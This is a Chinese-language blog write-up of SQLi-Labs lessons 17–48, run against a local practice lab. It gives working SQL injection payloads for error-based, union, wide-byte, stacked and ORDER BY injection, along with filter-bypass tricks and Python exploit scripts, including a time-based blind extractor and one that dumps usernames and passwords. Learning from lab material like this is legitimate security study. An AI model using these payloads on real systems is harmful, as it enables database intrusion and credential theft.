<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/img/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content>
    <meta name="author" content="John Doe">
    <meta name="keywords" content>
    <title>Sqli_Lab_Learning ~ W366er</title>
    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
    <link rel="stylesheet" href="/lib/nprogress/nprogress.css?v=0.2.0">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
    
        <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
    
    <link rel="stylesheet" href="/css/main.css">

    
</head>


<body>
<header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>W366er</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/categories/">Categories</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/tags/">Tags</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/about/">About</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2"
         style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
        <div class="full-bg-img">
            <div class="mask rgba-black-light flex-center">
                <div class="container text-center white-text wow fadeInUp">
                    <span class="h2" id="subtitle">
                        
                    </span>
                    
                        <br>
                        <p>Monday, November 4th 2019, 7:56 am</p>
                    
                </div>
            </div>
        </div>
    </div>
</header>

<main>
    
        

<div class="container-fluid">
    <div class="row">
        <div class="d-none d-lg-block col-lg-2"></div>
            <div class="col-lg-8 nopadding-md">
                <div class="py-5 z-depth-3 board">
                    <div class="post-content mx-auto">
                        <div class="markdown-body">
                            <h1 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h1><h2 id="Lesson-17"><a href="#Lesson-17" class="headerlink" title="Lesson 17"></a>Lesson 17</h2><p>首先有一个 PHP 的 check_input 的过滤机制：</p>
<pre><code>function check_input($value)
    {
    if(!empty($value))
        {
        // truncation (see comments)
        $value = substr($value,0,15);
        }

        // Stripslashes if magic quotes enabled
        if (get_magic_quotes_gpc()) // 默认为 false
            {
            $value = stripslashes($value);  // 删除反斜杠
            }

        // Quote if not a number
        if (!ctype_digit($value))
            {
            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;
            }

    else
        {
        $value = intval($value);
        }
    return $value;
    }
</code></pre><ul>
<li>“ $value = substr($value,0,15); ”该函数只截取前 15 个字符。</li>
<li>get_magic_quotes_gpc()函数，获取当前magic_quotes_gpc的配置选项设置。查一下手册：</li>
</ul>
<p><img src="/images/Sqli_Lab_Learning/get_magic_quotes_gpc.png" alt></p>
<p>题目这里的意思是如果原来设置了 get_magic_quotes_gpc()，则将该设置所添加的反斜杠去掉。</p>
<ul>
<li>ctype_digit() 函数，做纯数字检测。查一下手册：<br><img src="/images/Sqli_Lab_Learning/ctype_digit.png" alt></li>
<li>mysql_real_escape_string()函数，该函数是安全函数。<br><img src="/images/Sqli_Lab_Learning/mysql_real_escape_string.png" alt></li>
</ul>
<p>因此，这题 uname 无法利用（存在安全函数）。 所以，对 passwd 进行报错注入，并且uname 的值必须为 user  表中 username 字段中的某一个值。<br>exp 如下：</p>
<pre><code># -*- coding: utf-8 -*-
import requests

main_url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-17/index.php&quot;

payload = [&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;,  # 爆表
           &quot;select group_concat(column_name) from information_schema.columns where table_name=\&#39;users\&#39;&quot;,  # 爆字段
           ]
for i_payload in payload:
    main_payload = {&quot;uname&quot;:&quot;admin&quot;, &quot;passwd&quot;:&quot;admin\&#39; and updatexml(1,concat(0x7e,(&quot; + i_payload + &quot;),0x7e),1)#&quot;}
    response = requests.post(url=main_url, data=main_payload)
    print response.content
</code></pre><h2 id="Lesson-18-User-agent-注入"><a href="#Lesson-18-User-agent-注入" class="headerlink" title="Lesson 18 User agent 注入"></a>Lesson 18 User agent 注入</h2><p>uname 和 passwd 无法注入。发现 user agent 注入点，进行报错注入，uname 和 passwd 要确保能够有查询结果，payload:</p>
<pre><code>&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
<h2 id="Lesson-19-Referer-注入"><a href="#Lesson-19-Referer-注入" class="headerlink" title="Lesson 19 Referer 注入"></a>Lesson 19 Referer 注入</h2><p>同样地，uname 和 passwd 无法注入。存在 Referer 注入点，进行报错注入，uname 和 passwd 要确保有查询结果，payload:</p>
<pre><code>&#39; and updatexml(1,concat(0x7e, (select database()),0x7e),1) and &#39;1&#39; = &#39;1</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
<h2 id="Lesson-20-Cookie-注入"><a href="#Lesson-20-Cookie-注入" class="headerlink" title="Lesson 20 Cookie 注入"></a>Lesson 20 Cookie 注入</h2><p>uname 和 passwd 无法注入。存在 Cookie 注入点，进行报错注入，payload:</p>
<pre><code>uname=admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Cookie_sql.png" alt></p>
<h1 id="Advanced-Injections"><a href="#Advanced-Injections" class="headerlink" title="Advanced Injections"></a>Advanced Injections</h1><h2 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h2><p>Cookie 注入，万变不离其宗，报错注入加上 base64，’)闭合，payload 如下：</p>
<pre><code>uname=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkgYW5kICgnMScpPSgnMQ==</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_21_1.png" alt></p>
<h2 id="Lesson-22"><a href="#Lesson-22" class="headerlink" title="Lesson 22"></a>Lesson 22</h2><p>Cookie 注入，报错注入加上 base64，双引号闭合，payload 如下：</p>
<pre><code>uname=IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSwxKSBhbmQgIjEiID0iMQ==</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_22_1.png" alt></p>
<h2 id="Lesson-23"><a href="#Lesson-23" class="headerlink" title="Lesson 23"></a>Lesson 23</h2><p>普通联合注入，单引号闭合，payload 如下：</p>
<pre><code>?id=-1&#39; union select 2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),1 or &#39;1&#39; =&#39;1</code></pre><p>exp:</p>
<pre><code># -*- coding: utf-8 -*-
import requests

main_url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-23/index.php&quot;
for i in range(10):
    payload = &quot;?id=-1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database(&quot; \
              &quot;)limit + &quot; + str(i) + &quot;,1),2 or &#39;1&#39; =&#39;1 &quot;
    url = main_url + payload
    response = requests.get(url)
    result = response.text
    result = result[570:]
    result = result[:result.find(&quot;&lt;&quot;)]
    print result
    if result == &quot;&quot;:
        break


for i in range(10):
    payload2 = &quot;?id=-1&#39; union select 1,(select group_concat(username, &#39; _ &#39;, password) from users limit + &quot; + str(
        i) + &quot;,1),2 or &#39;1&#39; =&#39;1&quot;
    url = main_url + payload2
    response = requests.get(url)
    result = response.text
    result = result[570:]
    result = result[:result.find(&quot;&lt;&quot;)]
    print result
    if result == &quot;&quot;:
        break
</code></pre><h2 id="Lesson-24"><a href="#Lesson-24" class="headerlink" title="Lesson 24"></a>Lesson 24</h2><p>这题本身就有问题，猜测出题人漏了从 Logged-in.php 到 pass_change.php 的跳转。先抛开这个 bug。<br>这题为二次注入，首先理解什么是二次注入：</p>
<pre><code>原理：
攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。


步骤：
第一步：插入恶意数据
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

第二步：引用恶意数据
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</code></pre><ul>
<li>mysql_escape_string() 函数将单引号（’）转义。 </li>
<li>insert 语句中插入值含有 ‘#’ 不会起作用。</li>
<li>单转义斜杆在字符串中不会存入到数据库中。<br>由于上面两点，php 可以    将恶意数据当成安全数据存到数据库中。</li>
</ul>
<p>同时还要注意，第二次注入成功，还需要第二次和第一次相应的数据项匹配（像这里 admin 和 admin’#）。</p>
<h2 id="Lesson-25"><a href="#Lesson-25" class="headerlink" title="Lesson 25"></a>Lesson 25</h2><p>双写绕过注入，单引号闭合。<br>payload:</p>
<pre><code>?id=-1&#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23</code></pre><h2 id="Lesson-25a"><a href="#Lesson-25a" class="headerlink" title="Lesson 25a"></a>Lesson 25a</h2><p>双写绕过注入，无闭合。<br>payload:</p>
<pre><code>?id=-1 union select 1,3,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() %23</code></pre><h2 id="Lesson-26"><a href="#Lesson-26" class="headerlink" title="Lesson 26"></a>Lesson 26</h2><p>带 FUZZ，过滤 or，and，*，/，–，#，空格，\。<br>使用 %a0 绕过空格过滤，报错注入，单引号闭合。<br>payload:</p>
<pre><code>?id=-1&#39;||updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()), 0x7e),1)||&#39;1&#39;=&#39;1</code></pre><p>值得注意的是，这里 -1 和 子句之间的连接使用了 || 。（没搞懂为什么不可以用&amp;&amp;）</p>
<h2 id="Lesson-26a"><a href="#Lesson-26a" class="headerlink" title="Lesson 26a"></a>Lesson 26a</h2><p>FUZZ 和上题相同，但是’)闭合。<br>搞了半天报错注入，才发现没有 print_r(mysql_error()); 报错点，于是改用正常的联合注入。<br>payload:</p>
<pre><code>?id=&#39;)%a0union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()||(&#39;</code></pre><p>这里在 id 选择不赋值，因为如果赋负值，后台会将负值 “-“ 过滤掉，变成正值无法获得想要的回显。</p>
<h2 id="Lesson-27"><a href="#Lesson-27" class="headerlink" title="Lesson 27"></a>Lesson 27</h2><p>FUZZ 过滤了/，*，-，#，+，select，union。</p>
<p>源码：</p>
<pre><code>function blacklist($id)
{
$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out select
return $id;
}
</code></pre><ul>
<li>空格过滤使用 %a0 绕过。</li>
<li>三次写 select 对两次 select 过滤进行绕过。</li>
</ul>
<p>payload:</p>
<pre><code>?id=-1&#39;||updatexml(1,concat(0x7e,(selseselectlectect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),0x7e),1)||&#39;</code></pre><h2 id="Lesson-27a"><a href="#Lesson-27a" class="headerlink" title="Lesson 27a"></a>Lesson 27a</h2><p>FUZZ：</p>
<pre><code>function blacklist($id)
{
$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out Select
return $id;
}
</code></pre><p>“ 闭合，无 print_r(mysql_error()); 所以使用普通的联合注入。<br>payload:</p>
<pre><code>?id=&quot;unIon%a0sELEct%a01,(sELEct%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),3||&quot;</code></pre><p>这里可以使用之前的三次写 select，两次写 union 的方法，也可以大小写绕过。</p>
<h2 id="Lesson-28"><a href="#Lesson-28" class="headerlink" title="Lesson 28"></a>Lesson 28</h2><p>FUZZ 了 /，*，-，#，空格，union select。使用普通的联合注入，’) 闭合。<br>依然可以利用 %a0 绕过空格过滤，同时绕过 “union select” 的过滤。<br>payload:</p>
<pre><code>?id=&#39;)union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),2||(&#39;</code></pre><h2 id="Lesson-28a"><a href="#Lesson-28a" class="headerlink" title="Lesson 28a"></a>Lesson 28a</h2><p>上一题 FUZZ 缩减版。<br>payload 和上一题一样。</p>
<h2 id="Lesson-29"><a href="#Lesson-29" class="headerlink" title="Lesson 29"></a>Lesson 29</h2><p>无 FUZZ。<br>单引号闭合，普通的联合查询注入。<br>payload:</p>
<pre><code>?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code></pre><h2 id="Lesson-30"><a href="#Lesson-30" class="headerlink" title="Lesson 30"></a>Lesson 30</h2><p>无 FUZZ。<br>双引号闭合，普通的联合查询注入。<br>payload:</p>
<pre><code>?id=-1&quot; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code></pre><h2 id="Lesson-31"><a href="#Lesson-31" class="headerlink" title="Lesson 31"></a>Lesson 31</h2><p>无 FUZZ。<br>“)，普通的联合查询注入。<br>payload:</p>
<pre><code>?id=-1&quot;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code></pre><h2 id="Lesson-32-宽字节注入"><a href="#Lesson-32-宽字节注入" class="headerlink" title="Lesson 32 宽字节注入"></a>Lesson 32 宽字节注入</h2><p>原理：<br>宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK编码的时候（标志性的是 mysql_query(“SET NAMES gbk”); 语句），会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。可以利用这个特性，在一些特殊字符前加上一个 ASCII 码大于 128 的字符，像反斜杠，从而两个字符一并转化为一个汉字。</p>
<p>这里我们需要屏蔽反斜杠，于是 payload:</p>
<pre><code>?id=-1%df&#39;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><p>这题留下一个问题：</p>
<pre><code>&lt;?php
$string = &#39;\\\\&#39;;
echo $string .&quot;&lt;br&gt;&quot;;
echo  preg_quote(&#39;\\&#39;).&quot;&lt;br&gt;&quot;;
echo &quot;\\\\\\&quot; .&quot;&lt;br&gt;&quot;;
$string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\&quot;, $string);
echo $string;</code></pre><p>escape 转义反斜杠为什么需要 “\\\“ 六个反斜杠？</p>
<h2 id="Lesson-33"><a href="#Lesson-33" class="headerlink" title="Lesson 33"></a>Lesson 33</h2><p>与上题不同的是过滤变为 addslashes 函数。在手册查看 addslashes 函数。<br><img src="/images/Sqli_Lab_Learning/addslashes.png" alt></p>
<p>采用和上一题相同的注入方式，<br>payload:</p>
<pre><code>?id=-1%df&#39;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+</code></pre><h2 id="Lesson-34"><a href="#Lesson-34" class="headerlink" title="Lesson 34"></a>Lesson 34</h2><p>单引号闭合，联合查询注入。<br>同样是宽字节注入，但是 POST 传值和 GET 传值有一些不同。GET 传值会在后台会自动经过一次 URL 解码，但是 POST 不会有这个 URL 解码步骤。所以对于 POST 传值，我们直接使用 %df 对应的字符 �。<br>payload:</p>
<pre><code>uname=0�&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;passwd=1</code></pre><p><strong>宽字节注入真正起作用的是对应的注入字符，不是其字符编码。</strong></p>
<h2 id="Lesson-35"><a href="#Lesson-35" class="headerlink" title="Lesson 35"></a>Lesson 35</h2><p>普通的联合查询注入，addslashes 对无闭合查询没有影响。<br>payload:</p>
<pre><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) ,3 %23</code></pre><h2 id="Lesson-36"><a href="#Lesson-36" class="headerlink" title="Lesson 36"></a>Lesson 36</h2><p>之前提到过的 mysql_real_escape_string() 函数，再看一遍函数原理：<br><img src="/images/Sqli_Lab_Learning/mysql_real_escape_string.png" alt></p>
<p>单引号被转义，同 addslashes 的情况一样。并且满足存在语句：mysql_query(“SET NAMES gbk”); ，所以使用宽字节注入。<br>GET 方法，单引号闭合。<br>payload:</p>
<pre><code>?id=-1 %df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),2%23</code></pre><h2 id="Lesson-37"><a href="#Lesson-37" class="headerlink" title="Lesson 37"></a>Lesson 37</h2><p>POST 方法，单引号闭合。uname 和 passwd 都带有 mysql_real_escape_string（）函数转义。同上面 addslashes 思路基本一样。需要注意的是 POST 方法下，注入字符需要用字符形式表示。</p>
<pre><code>uname=-1�&#39; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),1 %23&amp;passwd=1</code></pre><h1 id="Stacked-Injections"><a href="#Stacked-Injections" class="headerlink" title="Stacked Injections"></a>Stacked Injections</h1><h2 id="Lesson-38-堆叠注入"><a href="#Lesson-38-堆叠注入" class="headerlink" title="Lesson 38 堆叠注入"></a>Lesson 38 堆叠注入</h2><p>可以使用普通的联合查询进行注入，GET 传值，单引号闭合。<br>payload:</p>
<pre><code>?id=&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),2 %23</code></pre><p>这题也涉及堆叠注入。使用堆叠注入的前提是存在 mysqli_multi_query( ) 函数（支持多条查询）。但是很多情况下数据库往往调用的是 mysqli_ query( ) 函数（只支持一条查询）。在手册查看一下mysqli_multi_query( ) 函数。</p>
<p><img src="/images/Sqli_Lab_Learning/mysqli_multi_query.png" alt></p>
<p>由于可以执行多条 SQL 语句，堆叠注入可以对数据库进行增删改查的操作。打破了联合查询的限制。<br>创建新表 test。<br>payload:</p>
<pre><code>?id=&#39;;create table test like users %23</code></pre><h2 id="Lesson-39"><a href="#Lesson-39" class="headerlink" title="Lesson 39"></a>Lesson 39</h2><p>普通的联合查询注入。GET 传值，无闭合。<br>payload:</p>
<pre><code>?id=&#39;&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><p>同时也存在堆叠注入。<br>payload:</p>
<pre><code>?id=&#39;&#39;;create table test like users%23</code></pre><h2 id="Lesson-40"><a href="#Lesson-40" class="headerlink" title="Lesson 40"></a>Lesson 40</h2><p>普通的联合查询注入。GET 传值，’) 闭合。<br>payload:</p>
<pre><code>?id=&#39;)  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23</code></pre><p>同样的堆叠注入。<br>payload:</p>
<pre><code>?id=&#39;) ;create table test like users%23</code></pre><h2 id="Lesson-41"><a href="#Lesson-41" class="headerlink" title="Lesson 41"></a>Lesson 41</h2><p>重复的题？<br>与 Lesson 39 一样。<br>payload:</p>
<pre><code>?id=&#39;&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></pre><p>堆叠注入。<br>payload:</p>
<pre><code>?id=&#39;&#39;;create table test like users%23</code></pre><h2 id="Lesson-42"><a href="#Lesson-42" class="headerlink" title="Lesson 42"></a>Lesson 42</h2><p>报错注入，单引号闭合，login_user 有 mysql_real_escape_string( ) 函数过滤，在 login_password 处注入。<br>payload:</p>
<pre><code>login_user=1&amp;login_password=&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&amp;mysubmit=Login</code></pre><p>奇怪的是这题目 hackerbar POST 不过去？只好在登陆框注入。</p>
<p>也可以使用堆叠注入。<br>payload:</p>
<pre><code>&#39;;create table test like users #</code></pre><h2 id="Lesson-43"><a href="#Lesson-43" class="headerlink" title="Lesson 43"></a>Lesson 43</h2><p>login_user 有 mysql_real_escape_string( )函数过滤，以 login_password 为注入点。<br>跟上一题类似，报错注入，改为’)闭合。<br>payload:</p>
<pre><code>login_user=1&amp;login_password=&#39;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&amp;mysubmit=Login</code></pre><p>堆叠注入。<br>payload:</p>
<pre><code>&#39;);create table test like users #</code></pre><h2 id="Lesson-44"><a href="#Lesson-44" class="headerlink" title="Lesson 44"></a>Lesson 44</h2><p>堆叠注入，login_user 有 mysql_real_escape_string( )函数过滤，以 login_password 为注入点。<br>POST 传值，单引号闭合。<br>payload:</p>
<pre><code>login_user=admin&amp;login_password=&#39;;create table test like users #&amp;mysubmit=Login</code></pre><p>时间盲注亦可。</p>
<h2 id="Lesson-45"><a href="#Lesson-45" class="headerlink" title="Lesson 45"></a>Lesson 45</h2><p>跟上一题相同，唯一不同的在于变成了 ‘) 闭合。<br>payload:</p>
<pre><code>login_user=admin&amp;login_password=&#39;);create table test like users #&amp;mysubmit=Login</code></pre><p>时间盲注亦可。</p>
<h2 id="Lesson-46-order-by-注入"><a href="#Lesson-46-order-by-注入" class="headerlink" title="Lesson 46 order by 注入"></a>Lesson 46 order by 注入</h2><p>order by 注入。什么是 order by 注入？</p>
<p>可控制的位置在order by子句后，如下order参数可控：select * from goods order by $_GET[‘sort’]</p>
<p>报错注入。<br>尽管如此，由于存在 print_error ，依然可以使用报错注入。GET 传值，单引号屏蔽。<br>payload:</p>
<pre><code>?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</code></pre><p>这题亦可以使用盲注。</p>
<p>这里出现了 mysql_fetch_assoc( ) 函数，顺便查看一下手册。<br><img src="/images/Sqli_Lab_Learning/mysql_fetch_assoc.png" alt></p>
<h2 id="Lesson-47"><a href="#Lesson-47" class="headerlink" title="Lesson 47"></a>Lesson 47</h2><p>和上一题相同，唯一区别在于这题为单引号闭合。</p>
<p>报错注入。<br>payload:</p>
<pre><code>?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><p>时间盲注亦可。</p>
<h2 id="Lesson-48"><a href="#Lesson-48" class="headerlink" title="Lesson 48"></a>Lesson 48</h2><p>order by 注入。<br>由于没有报错提示，仅能进行时间盲注。GET 传值，无闭合。<br>exp：</p>
<pre><code># -*- coding:utf-8 -*-
import sys
import time
import requests


def getPayload(result_index, char_index, ascii):
    # 系统表中数据
    info_database_name = &quot;information_schema&quot;
    info_table_name = &quot;tables&quot;  # schemata / tables / columns
    info_column_name = &quot;table_name&quot;  # schema_name / table_name / column_name

    # 注入表中数据
    database_name = &quot;security&quot;
    table_name = &quot;users&quot;
    column_name = [&quot;id&quot;, &quot;username&quot;, &quot;password&quot;]

    # 连接select
    where_str = &quot; where table_schema=database()&quot;
    # where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot;+&quot; and table_name=&#39;&quot;+table_name+&quot;&#39;&quot;
    select_str = &quot;select &quot; + info_column_name + &quot; from &quot; + info_database_name + &quot;.&quot; + info_table_name + where_str + &quot; limit &quot; + str(
        result_index) + &quot;,1&quot;
    # select_str = &quot;select concat_ws(&#39;-&#39;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot;

    # 连接payload
    sqli_str = &quot;if(ascii(mid((&quot; + select_str + &quot;),&quot; + str(char_index) + &quot;,1))=&quot; + str(ascii) + &quot;,sleep(0.2),0)&quot;
    payload = &quot;?sort=1&quot; + &quot; and &quot; + sqli_str + &quot;%23&quot;
    return payload


def execute(result_index, char_index, ascii):
    # 连接url
    url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-48/index.php&quot;
    payload = getPayload(result_index, char_index, ascii)
    # print(payload)
    # 检查延时
    before_time = time.time()
    url = url + payload
    response = requests.get(url)
    # print(response.text)
    after_time = time.time()
    use_time = after_time - before_time
    if use_time &gt; 0.1:
        return True
    else:
        return False


def exhaustive(result_index, char_index):
    # ascii可显字符从32到126共95个 按可能性顺序
    ascii_list = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;,
                  &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;,
                  &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39; &#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;,
                  &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;:&#39;,
                  &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;]
    for ascii_char in ascii_list:
        ascii = ord(ascii_char)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            return ascii_char
    return chr(1)


if __name__ == &quot;__main__&quot;:
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(32):  # 单条查询结果的长度
            count += 1
            char = exhaustive(num, len)
            if ord(char) == 1:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write(&quot;\r\n&quot;)
        sys.stdout.flush()
